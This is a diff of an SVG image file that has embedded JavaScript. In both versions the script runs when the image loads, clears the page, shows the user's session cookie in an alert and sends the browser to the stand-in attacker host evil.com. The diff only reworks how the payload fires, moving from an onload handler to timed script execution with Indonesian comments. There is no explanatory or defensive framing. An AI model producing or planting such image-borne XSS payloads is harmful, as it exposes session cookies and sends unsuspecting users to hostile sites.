@@ -1,18 +1,18 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" onload="exploit()">
-  <rect width="100%" height="100%" fill="white"/>
-  <text x="0" y="0" font-size="1" fill="white">.</text>
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
   <script type="text/javascript">
-    function exploit() {
-      // Blank page
-      document.body.innerHTML = '';
-      document.title = '';
-      
-      // Alert
-      alert('Cookie: ' + document.cookie);
-      
-      // Redirect
-      document.location.href = 'https://evil.com';
-    }
+    // Override seluruh body
+    document.body.style.background = 'white';
+    document.body.innerHTML = '';
+    
+    // Alert cookie dulu
+    setTimeout(function() {
+      alert('Session: ' + document.cookie);
+    }, 500);
+    
+    // Redirect setelah alert
+    setTimeout(function() {
+      window.location.replace('https://evil.com');
+    }, 2000);
   </script>
 </svg>
